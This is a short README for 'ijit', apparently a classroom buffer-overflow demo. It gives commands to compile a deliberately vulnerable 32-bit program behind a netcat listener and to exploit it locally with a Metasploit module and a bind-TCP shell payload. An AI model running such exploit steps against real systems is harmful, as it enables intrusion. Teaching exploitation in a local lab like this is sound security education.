# ijit
Simple buffer overflow demo, in the style of a Just-In-Time compiled (JIT) program.

Install metasploit and then check out this code.  
Softlink ijit.rb into metasploit's modules.
(Don't check out directly into modules/exploits, that will make 
msfconsole hang at startup when it sees the executable git hooks!)

```
cd
git clone https://github.com/olawlor/ijit
mkdir -p ~/.msf4/modules/exploits/linux/ijit
cd ~/.msf4/modules/exploits/linux/ijit
ln -s ~/ijit/ijit.rb .
```

Now compile and run the vulnerable program (compiled here as a 32-bit x86 program):

```
cd ~/ijit
gcc -m32 ijit.c -o ./ijit32 
nc -l -p 8888 | ./ijit32
```

Leave the vulnerable program running.

In another terminal, exploit it with msfconsole:

```
msfconsole
use exploit/linux/ijit/ijit 
reload
set RHOST 127.0.0.1
set nop x86/single_byte
set payload linux/x86/shell/bind_tcp
exploit
```

